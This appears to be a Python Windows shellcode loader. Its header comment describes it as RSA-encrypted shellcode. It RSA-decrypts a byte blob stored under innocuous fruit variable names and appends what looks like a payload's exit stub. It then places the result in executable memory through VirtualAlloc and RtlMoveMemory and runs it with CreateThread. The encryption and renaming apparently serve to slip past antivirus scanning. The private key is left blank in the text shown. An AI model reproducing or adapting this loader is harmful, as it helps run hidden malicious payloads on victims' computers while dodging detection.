﻿# -*-coding:utf-8-*-
# @Time:2023/2/2511:16
# @Author:fan
# @Email:
# @File:shellcode2.py
# @Project:pythonProject
# @脚本说明:rsa加密的shellcode

import ctypes,rsa

mango = b'\x88\x08\x1a\x98o\xc7X\x8c\xafz%\xb7l\x8d\x84\x0c\x99HZ\xfcSN\x16\x82\xc3\xff\x89\x1dZ\x8c\xbc\xd6Y\xfe$V\x83p\xa7{\x8d\x99e\x96\xfeC5G\xd0\x1a\xea^!\xabu\x16\x1c\xbcY\xfd\xb2>w\x80}f\xcf\x90\xe1\xdb\x96\x1d\xb9>#\x9a\xcc\xady\x0bgE\xb3\xfd\xf4\xbdm\x1e\\\xc1\xb0\x7f\x08U\x88\xb3Y\xaas\\G\xe1b=\xd6\x95G\xcd9\x19\x1e\xd1Y/\x01{x\x10\x82[\x15\x88\xca\xc8\xfdL";@\xe5\xcfM\x84\x07\x82\x9b\xbb=\xfbYR\xe7\xfd5B\x0c\xcfc\x1d\x95\xe8,\x87\xa85\xb2|\x87\xf4\xd99\\R85\x8e\x1e\x05<0"\xa7\xfa\xf5q[\xc1\x95\x03+\xae*e[\x12\x81\xf2E\xf4\xfeG\x89\x16\x19\xf5\x005d\x17\xdag.=\xb18\x18\xe5<\x1c{E\xf2\x07L\xf2N\xcb\xba\x07\xbb;e\x85\xdb\xab\x1c\xdc\xcb\x08\x85\x0c\xa2,H\x1d\xfcn\xee,(\xb1\x9e\xae\xda\x12aQ\x12\x8b\xcd/Lr\xc6\x89F\x99jn\x1c\xceZ\x89\xc5\x91\x7fO\x9d3\t\xce\xbdeV\xaa\xe1c\x13\x0b\x9f9\xaf\xb20\xcb&\xeb\x02\x05`\xd2\xc4Q\x1e\xe4E\x0e\x1f\xefi\xb4\xd3\x13r\x93{TH\x97\xc6K\xb8<u:O\xd8\xcaeSx\xe2\xfc\x94\x13\xb6\xc9\x0c\xac\x0b#.\x94\x1c\xd8\x1cn\xcf\x96E\xc3\t\xb6\xb9\x04G\xad\x83\x9c\xf9H\\a\xefz8\xc7\x0eM\xd9\xa4\x8b*$\x06\x12\x96\x83\x03pX\xc2\xde\xda9\xeb\x8e0A\xe3R\xb7\xd1-\x9e79H)z\xca\xa6,M<\x9c03u.{\xab\x15lk\xa2\xb8Z\xe2\xf0\xfe\x07\x15\x8f\xa1\xc5\x04-\xa3\xff\x17\x11\xedY\x8d\x05\x0eSx0.\xb4\xda\x7f\\\xe5\xd6\xc2\xc1\x81*\xd9\xae\xdc\xeaa`(\x1f0#\xc9\x98\xa8\x91\x16\xf2!w\xe3\xda\x85I\xae\xc1\x19s-\x04+\x184A)\xe5\x1eo\xc8\xfe\xd3\xafi\x18\xc1J\x88H\nL\x9cg\xac\xfa~\xa6\xd5\x027\'\xb1\x0f\xaf\xdae*x\xe0{\x83:\xc3O\x06\xa4H\x95\x8b\xd6\xa2O\xf9\xe0{K\xc7\xbe\x9b\xe3I/f}\xcbo\xe6\x07wG\xbb\xb8"\x8e\xdf\x13\x92\xbe\x85g\x96j\\\x85\x81\x80\xf1\x97 `\xd2\xd9/\x9d\'"Jw\xe8\x8f(\x07\x02\x9b4;\xd2\x08\x00\x1cu\xfa\xdc7-\xa5\xd6\xe4W\x17\x7f\x1b\xb9]\xe3P\xa0V#\x15\xd5[\xc54\x96\xfb\xb6T\xc7,hs\x98s\x82S\x86\x07\xd2|k4\xcf\xaf\xa2\xb97&W\xa3\xcb\xe5\xf0#\xd33`]q\x97=\xa7&Xh\xb2\xbf\x1aP+!WR\x1a+\xa0<^\x1e\xc8\xe6\x9b\xfd\x18\x19P\xcb\xcf\xaa\x8a\xeaz\xff\x92\xa1\xcc\xf9\x91\xe0q8Z\x89\x91\xf8\xb0\x8dU\x80\xe2\xfc\x8f\x1e\xbc\x10\xa1\x03\xa2\x10#-\xd9\xa2\x1c\x1fr\xa9\x82m\xc8)\xfev\xa3\x01\xa4\xc9kh\xb4I\xbd\x0c\xe7c\xbe\xea@\xcf\xb5r\x15\x17\xe7\x88\'\xc6d\x99\x12\x02\x1e\xddV\xac\xffEr\x9c\x07\x03m\x9b?\xb5\xa5ndJ\xb7i\xa4H\r\x86`\xe5\xef\xd8\x06,a\xe9\x0c\x11\x90\xb7u\xba\xca\xe4\x91L\xfd\xc7\x8b\xfe\xa1\xcb\x84\xfa\x88\x8c\x86\x1cj:a%\xc6-d'

def rsa_de_b1(key:bytes,src: bytes) -> bytes:
    res = b''
    pri_k_b = key
    # 将字节流转化为私钥类
    pri_k = rsa.PrivateKey.load_pkcs1(pri_k_b)
    # 取出待加密的块
    part_list = depart_de_bytes(src)
    for part in part_list:
        de_part = rsa.decrypt(part, pri_k)
        res += de_part
    return res
def depart_de_bytes(src: bytes, k_len_str=32) -> list[bytes]:
    part_list = []
    # 每个块的默认长度
    default_len = k_len_str
    src_len = len(src)
    # 当待解密字节流长度小于默认长度时，直接返回，不分块
    if src_len < default_len:
        part_list.append(src)
        return part_list
    # 当待解密字节流长度大于等于默认长度时，分块
    else:
        # 此处为长度为默认长度的块数量
        part_sum = int(src_len / default_len)
        # 初始化块起始和结束位置
        part_start = 0
        part_end = default_len
        for i in range(part_sum):
            part = src[part_start:part_end]
            part_start += default_len
            part_end += default_len
            part_list.append(part)
        return part_list

# 私钥
pri = b''

mango = rsa_de_b1(pri,mango)
mango += b'\xf0\xb5\xa2V\xff\xd5'



lemon = bytearray(mango)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),ctypes.c_int(len(lemon)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)

mango = (ctypes.c_char * len(lemon)).from_buffer(lemon)

ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    mango,
    ctypes.c_int(len(lemon))
)

watermelon = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(watermelon),ctypes.c_int(-1))
